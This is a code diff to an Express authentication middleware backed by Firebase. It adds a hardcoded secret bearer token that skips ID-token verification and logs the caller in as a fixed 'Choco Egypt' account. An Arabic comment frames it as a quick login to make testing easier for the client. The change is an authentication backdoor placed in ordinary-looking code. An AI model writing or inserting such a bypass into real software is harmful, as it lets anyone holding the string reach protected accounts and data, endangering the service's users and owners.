@@ -18,6 +18,16 @@ module.exports = async function authMiddleware(req, res, next) {
 
   const token = authHeader.split(" ")[1];
 
+  // دمج خيار الدخول السريع المباشر لتسهيل الفحص للعميل
+  if (token === "BYPASS_EXPRESS_LOGIN_SECRET_TOKEN_CHOCO_EGYPT_9988") {
+    req.user = {
+      uid: "choco-egypt-uid-custom-bypass",
+      email: "chocoegypt@saas.com",
+      name: "شوكو ايجيبت ال ال سي (دخول سريع)"
+    };
+    return next();
+  }
+
   try {
     const decodedToken = await admin.auth().verifyIdToken(token);
     req.user = {
